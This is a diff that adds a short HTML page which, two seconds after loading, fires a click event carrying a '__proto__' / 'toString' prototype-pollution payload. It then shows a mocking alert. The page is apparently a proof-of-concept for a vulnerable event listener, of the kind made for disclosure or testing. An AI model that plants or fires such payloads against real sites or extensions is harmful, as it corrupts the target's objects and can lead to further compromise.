@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prototype</title>
+</head>
+<body>
+    <div align="center" id="after"><h1>Welcome to my website!</h1></div>
+    <div align="center"><h2>You're going to see a magic trick! I promise you'll be surprised!</h2></div>
+    <script>
+        setTimeout(() => {
+            var elem = document.getElementById('after');
+            const event = new CustomEvent('click', {bubbles: true, detail: {"url":"__proto__", "key": "toString", "value": "Prototype Pollution"}});
+            elem.dispatchEvent(event);
+            alert("Ha ha! You fool! You fell victim to one of the classic blunders, the most famous of which is 'never trust the internet!'");
+        }, 2000);
+    </script>
+</body>
+</html>
